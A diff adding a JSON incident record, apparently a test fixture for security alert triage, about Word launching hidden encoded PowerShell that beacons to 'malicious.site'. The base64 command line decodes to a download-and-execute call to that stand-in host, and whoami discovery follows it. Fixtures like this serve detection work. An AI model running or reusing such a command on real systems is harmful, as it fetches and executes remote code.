@@ -1,0 +1,62 @@
+{
+  "incident_id": "INC-2026-9812",
+  "title": "Suspicious Encoded PowerShell with Multi-Stage C2 Beaconing",
+  "severity": "critical",
+  "rule_name": "PowerShell.ObfuscatedPayload.ExternalSocket",
+  "timestamp": "2026-10-06T22:45:00Z",
+  "description": "Endpoint detection flagged encoded PowerShell spawned from Word, performing local discovery and initiating outbound TLS connections to untrusted domain.",
+  "flagged_logs": [
+    {
+      "timestamp": "2026-10-06T22:45:00Z",
+      "event_type": "process",
+      "host": "FINANCE-DESKTOP-04",
+      "user": "corp\\aditya",
+      "data": {
+        "process_name": "WINWORD.EXE",
+        "process_id": 4120,
+        "command_line": "\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" \"C:\\Users\\aditya\\Downloads\\Invoice_Q3.docm\""
+      }
+    },
+    {
+      "timestamp": "2026-10-06T22:45:08Z",
+      "event_type": "process",
+      "host": "FINANCE-DESKTOP-04",
+      "user": "corp\\aditya",
+      "data": {
+        "process_name": "powershell.exe",
+        "process_id": 5820,
+        "parent_process_id": 4120,
+        "parent_process_name": "WINWORD.EXE",
+        "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBiAGUAYQBjAG8AbgAnACkA"
+      }
+    },
+    {
+      "timestamp": "2026-10-06T22:45:18Z",
+      "event_type": "process",
+      "host": "FINANCE-DESKTOP-04",
+      "user": "corp\\aditya",
+      "data": {
+        "process_name": "whoami.exe",
+        "process_id": 5910,
+        "parent_process_id": 5820,
+        "parent_process_name": "powershell.exe",
+        "command_line": "whoami /priv /groups"
+      }
+    },
+    {
+      "timestamp": "2026-10-06T22:45:30Z",
+      "event_type": "network",
+      "host": "FINANCE-DESKTOP-04",
+      "user": "corp\\aditya",
+      "data": {
+        "process_id": 5820,
+        "process_name": "powershell.exe",
+        "source_ip": "10.0.12.88",
+        "destination_ip": "198.51.100.23",
+        "destination_port": 443,
+        "protocol": "TCP",
+        "domain": "malicious.site"
+      }
+    }
+  ]
+}
